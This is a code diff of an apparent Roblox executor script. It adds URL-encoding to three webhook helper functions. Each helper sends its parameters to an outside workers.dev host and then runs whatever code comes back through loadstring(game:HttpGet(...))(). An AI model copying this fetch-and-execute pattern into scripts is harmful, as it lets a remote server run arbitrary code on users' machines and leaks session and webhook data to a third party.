@@ -59,16 +59,22 @@ else
 _G.id="not"
 end end
 
+local function encode(str)
+    return tostring(str):gsub("([^%w%-_%.%~])", function(c)
+        return string.format("%%%02X", string.byte(c))
+    end)
+end
+
 function _G.webhook1(webhook,title,prlc,jobid)
-loadstring(game:HttpGet("https://webhook-api.nekokawaii.workers.dev/api/?type=1&webhook="..webhook.."&title="..title.."&prlc="..prlc.."&jobid="..jobid))()  
+    loadstring(game:HttpGet("https://webhook-api.nekokawaii.workers.dev/api/?type=1&webhook="..encode(webhook).."&title="..encode(title).."&prlc="..encode(prlc).."&jobid="..encode(jobid)))()  
 end
 
 function _G.webhook2(webhook,title,name,content)
-loadstring(game:HttpGet("https://webhook-api.nekokawaii.workers.dev/api/?type=2&webhook="..webhook.."&title="..title.."&name="..name.."&content="..content))()  
+    loadstring(game:HttpGet("https://webhook-api.nekokawaii.workers.dev/api/?type=2&webhook="..encode(webhook).."&title="..encode(title).."&name="..encode(name).."&content="..encode(content)))()  
 end
 
 function _G.webhook3(webhook,title,smalltitle,content,prlc,jobid)
-loadstring(game:HttpGet("https://webhook-api.nekokawaii.workers.dev/api/?type=3&webhook="..webhook.."&title="..title.."&smalltitle="..smalltitle.."&content="..content.."&prlc="..prlc.."&jobid="..jobid))()  
+    loadstring(game:HttpGet("https://webhook-api.nekokawaii.workers.dev/api/?type=3&webhook="..encode(webhook).."&title="..encode(title).."&smalltitle="..encode(smalltitle).."&content="..encode(content).."&prlc="..encode(prlc).."&jobid="..encode(jobid)))()  
 end
 
 pcall(function()  
